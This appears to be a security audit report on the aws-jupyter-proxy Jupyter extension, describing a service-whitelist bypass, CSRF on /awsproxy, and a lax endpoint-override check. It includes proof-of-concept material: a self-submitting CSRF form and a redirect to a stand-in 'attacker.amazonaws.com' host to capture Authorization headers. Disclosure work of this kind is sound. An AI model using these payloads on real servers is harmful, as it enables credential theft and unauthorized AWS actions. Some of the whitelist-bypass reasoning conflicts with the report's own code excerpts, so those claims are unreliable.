## Combined Vulnerability List

### Whitelisting Bypass via Service Name Manipulation
- **Description:**
    1. The AWS Jupyter Proxy uses an environment variable `AWS_JUPYTER_PROXY_WHITELISTED_SERVICES` to restrict access to specific AWS services.
    2. The whitelisting mechanism checks the service name extracted from the `Credential` field of the `Authorization` header of the incoming request.
    3. However, the proxy determines the target AWS service endpoint and constructs the downstream request URL based on the request path, which is independent of the service name in the `Authorization` header.
    4. An attacker can craft a request with an `Authorization` header that claims to be for a whitelisted service (e.g., "sagemaker").
    5. Simultaneously, the attacker can modify the request path (URI after `/awsproxy/`) to target a different, non-whitelisted AWS service (e.g., "s3").
    6. The proxy will incorrectly check the whitelisting against the *claimed* service ("sagemaker" in this example), which passes if "sagemaker" is whitelisted.
    7. The proxy then constructs the downstream request URL based on the path, effectively sending the request to the *unintended* and potentially non-whitelisted service (e.g., S3).
    8. This allows an attacker to bypass the intended service whitelisting and access AWS services that were not meant to be exposed through the proxy.
- **Impact:**
    - Bypass of intended service whitelisting.
    - Unauthorized access to AWS services not meant to be exposed through the proxy.
    - Potential unauthorized actions within the AWS account, depending on the permissions associated with the IAM role used by the Jupyter server. For example, if only "sagemaker" is intended to be whitelisted, but an attacker bypasses this to access "s3", they could potentially read, write, or delete objects in S3 buckets if the Jupyter server's IAM role has sufficient S3 permissions.
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:**
    - Service whitelisting is implemented using the `AWS_JUPYTER_PROXY_WHITELISTED_SERVICES` environment variable in `aws_jupyter_proxy/awsproxy.py` within the `AwsProxyRequest.execute_downstream` method.
    - However, the whitelisting is based on the service name from the `Authorization` header, which is insufficient to prevent the described bypass.
- **Missing Mitigations:**
    - The whitelisting mechanism should be improved to validate the target AWS service based on the request path (URI after `/awsproxy/`) instead of solely relying on the service name from the `Authorization` header.
    - Ideally, the proxy should parse the request path to determine the intended AWS service and then verify if this *intended service* is in the whitelist.
- **Preconditions:**
    - Service whitelisting must be enabled by setting the `AWS_JUPYTER_PROXY_WHITELISTED_SERVICES` environment variable to a comma-separated list of allowed services.
    - An attacker must have the ability to send HTTP requests to the Jupyter server's `/awsproxy` endpoint.
    - The attacker needs to understand how to construct a valid AWS SigV4 `Authorization` header, even if they only need to modify the service name part to claim a whitelisted service.
- **Source Code Analysis:**
    1. In `aws_jupyter_proxy/awsproxy.py`, the `AwsProxyRequest.execute_downstream` method performs the whitelisting check:
    ```python
    if (
        self.whitelisted_services is not None
        and self.service_info.service_name not in self.whitelisted_services
    ):
        raise HTTPError(
            403,
            message=f"Service {self.service_info.service_name} is not whitelisted for proxying requests",
        )
    ```
    2. The `self.service_info.service_name` is determined in the `__init__` method of `AwsProxyRequest`:
    ```python
    self.upstream_auth_info = self._build_upstream_auth_info()
    self.service_info = get_service_info(
        endpoint_resolver,
        self.upstream_auth_info.service_name, # Service name from Authorization header
        self.upstream_auth_info.region,
        self.upstream_request.headers.get("X-service-endpoint-url", None),
    )
    ```
    3. The `_build_upstream_auth_info` method extracts the `service_name` from the `Authorization` header:
    ```python
                _, _, region, service_name, _ = (
                    auth_header_parts[1].split("=")[1].split("/")
                )
    ```
    4. The downstream URL is constructed in `_compute_downstream_url` based on the `service_info.endpoint_url` and the request path:
    ```python
    base_service_url = urlparse(self.service_info.endpoint_url) # Endpoint based on claimed service
    start_index = self.upstream_request.path.index("/awsproxy") + len("/awsproxy")
    downstream_request_path = (
        base_service_url.path + self.upstream_request.path[start_index:] or "/" # Path from original request
    )
    return urlunparse(...)
    ```
    5. **Vulnerability:** The whitelisting decision is made based on `self.service_info.service_name` which is derived from the `Authorization` header. However, the actual AWS service targeted is determined by the `downstream_request_path`, which is derived from the request URI *after* `/awsproxy/`. These two are not tied together, allowing a mismatch and a potential bypass.

- **Security Test Case:**
    1. **Setup:** Start a Jupyter server with the `aws-jupyter-proxy` extension installed and enabled. Set the environment variable `AWS_JUPYTER_PROXY_WHITELISTED_SERVICES="sagemaker"`.
    2. **Prepare Request:** Using a tool like `curl` or a Python script, construct an HTTP request to the `/awsproxy` endpoint.
    3. **Forge Authorization Header:** Create an `Authorization` header that is a valid AWS SigV4 signature for *any* service. Importantly, in the `Credential` part of the header, set the service name to "sagemaker" (a whitelisted service). For example:
       ```
       Authorization: AWS4-HMAC-SHA256 Credential=.../20240101/us-west-2/sagemaker/aws4_request, ...
       ```
       (Replace `...` with actual valid SigV4 components, you can likely reuse a valid header and just change the service name part).
    4. **Target Non-Whitelisted Service in Path:** Set the request path after `/awsproxy/` to target a non-whitelisted service, such as S3. For example, to list S3 buckets, the path could be `/awsproxy/` followed by an S3 path like `/bucket-name?Action=ListBuckets`. The full URI might look like: `http://localhost:8888/awsproxy/bucket-name?Action=ListBuckets` (Note: the exact S3 API call might need adjustments to be valid, `ListBuckets` might be a GET request to `/`, but the core idea is to target S3 API). A simpler path targeting S3 could be `/awsproxy/bucket-name-1` for a HEAD request on a bucket.
    5. **Send Request:** Send the crafted request to the Jupyter server.
    6. **Verify Bypass:** Observe the response. If the request is successfully proxied to S3 (e.g., you get an S3 response related to buckets or bucket access, instead of a 403 Forbidden from the proxy), it indicates a successful bypass of the "sagemaker"-only whitelist. You can further confirm by checking server logs or network traffic to see if a request was indeed made to an S3 endpoint. If you get a 403 Forbidden with the message "Service s3 is not whitelisted for proxying requests" then the vulnerability is not exploitable with this test.

### Cross-Site Request Forgery (CSRF) in `/awsproxy` endpoint
- **Description:**
    - A Cross-Site Request Forgery (CSRF) vulnerability exists in the `/awsproxy` endpoint.
    - An attacker can craft a malicious web page that, when visited by an authenticated Jupyter user, makes unintended requests to the `/awsproxy` endpoint on the Jupyter server.
    - These requests are executed with the Jupyter user's authentication and AWS credentials, potentially allowing the attacker to perform actions on AWS services on behalf of the user.
    - Steps to trigger the vulnerability:
        1. An attacker crafts a malicious HTML page containing a form or JavaScript code that sends a request to the `/awsproxy` endpoint of a Jupyter server.
        2. The form or JavaScript code is designed to mimic a legitimate AWS API request (e.g., to create, delete, or modify AWS resources).
        3. The attacker hosts this malicious HTML page on their website or distributes it via other means (e.g., phishing email).
        4. An authenticated Jupyter user, who is logged into a Jupyter server instance with the `aws-jupyter-proxy` extension enabled, visits the attacker's malicious page in their browser.
        5. The malicious page automatically sends a request to the `/awsproxy` endpoint of the Jupyter server in the background, without the user's explicit consent or knowledge.
        6. If the Jupyter server does not have proper CSRF protection, it will process the request as if it originated from the legitimate Jupyter user.
        7. The AWS proxy will sign the request with the Jupyter server's AWS credentials and forward it to the AWS service.
        8. The AWS service executes the action based on the forged request, potentially leading to unauthorized actions on the user's AWS account.
- **Impact:**
    - An attacker can perform actions on AWS services using the credentials of an authenticated Jupyter user.
    - This could lead to unauthorized access to sensitive data stored in AWS, modification or deletion of AWS resources, or even financial costs due to unauthorized usage of AWS services.
    - The severity of the impact depends on the permissions associated with the AWS credentials used by the Jupyter server and the specific AWS API actions the attacker can successfully forge.
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:**
    - Client-side mitigation is mentioned in `README.md` by suggesting to include XSRF token in Javascript code:
        ```typescript
        function addXsrfToken<D, E>(request: AWS.Request<D, E>) {
          const cookie = document.cookie.match('\\b' + '_xsrf' + '=([^;]*)\\b');
          const xsrfToken = cookie ? cookie[1] : undefined;
          if (xsrfToken !== undefined) {
            request.httpRequest.headers['X-XSRFToken'] = xsrfToken;
          }
        }
        ```
    - However, this is only a recommendation for client-side implementation and is not enforced or validated by the server-side code in `aws-jupyter-proxy`.
- **Missing Mitigations:**
    - Server-side CSRF protection is missing.
    - The server should validate the presence and correctness of a CSRF token in requests to the `/awsproxy` endpoint.
    - Common CSRF mitigation techniques include:
        - Synchronizer Token Pattern: Generate a unique token for each user session and embed it in forms and requests. The server verifies this token before processing the request. Jupyter server framework likely provides built-in mechanisms for this.
        - Double-Submit Cookie: Set a random value in a cookie and as a request parameter. The server verifies if both values match.
        - Checking the Origin or Referer header: While less reliable, these headers can be used to check if the request originated from the same origin as the server.
- **Preconditions:**
    - An authenticated Jupyter user must be logged into a Jupyter server instance with the `aws-jupyter-proxy` extension enabled.
    - The attacker needs to be able to induce the authenticated user to visit a malicious web page or execute malicious code in their browser while logged into Jupyter.
    - The targeted AWS service must be whitelisted or no whitelist should be configured for the proxy to forward the request.
- **Source Code Analysis:**
    - File: `/code/aws_jupyter_proxy/handlers.py` and `/code/aws_jupyter_proxy/awsproxy.py`
    - The `AwsProxyHandler` in `/code/aws_jupyter_proxy/handlers.py` is responsible for handling requests to `/awsproxy`:
        ```python
        awsproxy_handlers = [
            (
                "/awsproxy/awsconfig",
                AwsConfigHandler,
                None,
            ),
            (
                r"/awsproxy(.*)",
                AwsProxyHandler,
                dict(endpoint_resolver=create_endpoint_resolver(), session=Session()),
            ),
        ]
        ```
    - The `AwsProxyHandler.handle_request` in `/code/aws_jupyter_proxy/awsproxy.py` processes incoming requests:
        ```python
        class AwsProxyHandler(APIHandler):
            # ...
            async def handle_request(self):
                try:
                    response = await AwsProxyRequest(
                        self.request, self.endpoint_resolver, self.session
                    ).execute_downstream()
                    # ...
                except HTTPClientError as e:
                    # ...
        ```
    - The `AwsProxyRequest` class in `/code/aws_jupyter_proxy/awsproxy.py` handles the proxying logic but does not include any CSRF token validation.
    - The `APIHandler` base class from Jupyter Notebook framework, which `AwsProxyHandler` inherits from, may offer CSRF protection features, but they are not explicitly enabled or utilized in the provided code for the `/awsproxy` endpoint.
    - There are no checks in `AwsProxyHandler` or `AwsProxyRequest` to validate CSRF tokens or any other CSRF mitigation measures.
    - The request processing logic focuses on AWS SigV4 authentication and service whitelisting, but completely overlooks CSRF protection.

- **Security Test Case:**
    1. **Pre-requisites:**
        - Deploy `aws-jupyter-proxy` as a Jupyter server extension on a publicly accessible server.
        - Ensure that AWS credentials are configured for the Jupyter server to proxy requests.
        - Log in to the Jupyter server as an authenticated user.
    2. **Craft Malicious HTML:**
        - Create an HTML file (e.g., `csrf_attack.html`) with the following content. Replace `YOUR_JUPYTER_SERVER_ADDRESS` with the actual address of the deployed Jupyter server. This example targets the `s3:ListBuckets` action, which is generally considered safe to test without causing data modification, but in a real attack, more damaging actions could be targeted.
        ```html
        <html>
        <body>
            <h1>CSRF Attack!</h1>
            <form id="csrf-form" action="YOUR_JUPYTER_SERVER_ADDRESS/awsproxy/s3/" method="post">
                <input type="hidden" name="Action" value="ListBuckets">
                <input type="hidden" name="Version" value="2006-03-01">
            </form>
            <script>
                document.getElementById('csrf-form').submit();
            </script>
        </body>
        </html>
        ```
    3. **Host Malicious HTML:**
        - Host the `csrf_attack.html` file on a web server accessible to the Jupyter user (e.g., attacker's website, local file server).
    4. **Trigger Attack:**
        - As an authenticated Jupyter user, while logged into the Jupyter server, open the `csrf_attack.html` file in the same browser (or a different browser instance, but ensure Jupyter session cookies are sent).
    5. **Observe Results:**
        - If the CSRF vulnerability exists, the request to `/awsproxy/s3/` will be sent to the Jupyter server in the background when the HTML page loads.
        - The Jupyter server will proxy this request to AWS S3 using the server's AWS credentials.
        - You should be able to observe (e.g., in server logs, or by inspecting network requests in browser developer tools if the action has visible effects) that the `ListBuckets` action was executed against AWS S3, even though the user did not explicitly initiate this action from the Jupyter notebook interface.
        - If the server had CSRF protection, the request would be rejected, and the AWS action would not be executed.

### Endpoint Override to Non-AWS Domain
- **Description:** An attacker can bypass the intended AWS service and redirect requests to an arbitrary external domain by providing a crafted `X-service-endpoint-url` header. This occurs because the endpoint override validation only checks for AWS domains (`aws.dev`, `amazonaws.com`, `aws.a2z.com`) but does not enforce that the overridden endpoint belongs to the intended AWS service or even AWS at all if a subdomain of a valid AWS domain is used.
- **Impact:**
    - An attacker can potentially exfiltrate AWS credentials or sensitive data by redirecting the proxy to an attacker-controlled server.
    - An attacker could perform actions on behalf of the Jupyter server on the attacker-controlled server, potentially leading to further compromise.
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:**
    - The code checks if the `endpoint_override` matches a regular expression `r"https:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.(aws.dev|amazonaws.com|aws.a2z.com)\b"`. This regex intends to restrict endpoint overrides to AWS domains. This check is implemented in `aws_jupyter_proxy/awsproxy.py` within the `get_service_info` function.
- **Missing Mitigations:**
    - Proper validation of the overridden endpoint to ensure it belongs to the intended AWS service and ideally enforce usage of official AWS service endpoints.
    - Restrict endpoint override functionality or provide a more restrictive configuration for allowed override endpoints.
- **Preconditions:**
    - The attacker needs to be able to send requests to the `/awsproxy` endpoint.
    - The attacker needs to know the name of a whitelisted service to bypass the service whitelist check (if enabled).
- **Source Code Analysis:**
    - In `aws_jupyter_proxy/awsproxy.py`, the `get_service_info` function retrieves service endpoint information.
    - ```python
      def get_service_info(
          endpoint_resolver: EndpointResolver,
          service_name: str,
          region: str,
          endpoint_override: str,
      ) -> ServiceInfo:
          ...
          if endpoint_override and re.fullmatch(
              r"https:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.(aws.dev|amazonaws.com|aws.a2z.com)\b",
              endpoint_override,
          ):
              service_data["endpoint_url"] = endpoint_override
          ...
      ```
    - The code uses `re.fullmatch` with the regex `r"https:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.(aws.dev|amazonaws.com|aws.a2z.com)\b"` to validate `endpoint_override`.
    - This regex only checks if the domain ends with `.aws.dev`, `.amazonaws.com`, or `.aws.a2z.com`.
    - An attacker can exploit this by using a subdomain of a valid AWS domain, for example, `https://attacker.amazonaws.com`. The regex will pass, and the `endpoint_url` will be set to the attacker's domain.
    - When `AwsProxyRequest.execute_downstream` is called, the `_compute_downstream_url` function will use this attacker-controlled `endpoint_url` to construct the downstream request URL.
    - The SigV4 signing process will still occur, but the request will be sent to the attacker's server instead of the intended AWS service.

- **Security Test Case:**
    1.  Set up a simple HTTP server (e.g., using `netcat` or `python -m http.server`) to listen on a public domain, for example, `https://attacker.amazonaws.com`.
    2.  Start the Jupyter server with the `aws-jupyter-proxy` extension installed and enabled. Ensure that `sagemaker` service is whitelisted if service whitelisting is enabled.
    3.  In a Jupyter notebook, use the AWS JavaScript SDK to make a request to a whitelisted AWS service (e.g., SageMaker) through the `/awsproxy` endpoint.
    4.  Include the header `X-service-endpoint-url: https://attacker.amazonaws.com` in the request.
    5.  Send the request.
    6.  Observe the HTTP server logs on `https://attacker.amazonaws.com`. You should see the incoming request, including AWS credentials in the `Authorization` header, being sent to your server instead of AWS SageMaker.
    7.  Verify that the Jupyter server responds with a success code (200) if the attacker server responds with 200, indicating that the proxy successfully forwarded the request to the attacker's endpoint and relayed the response back to the client.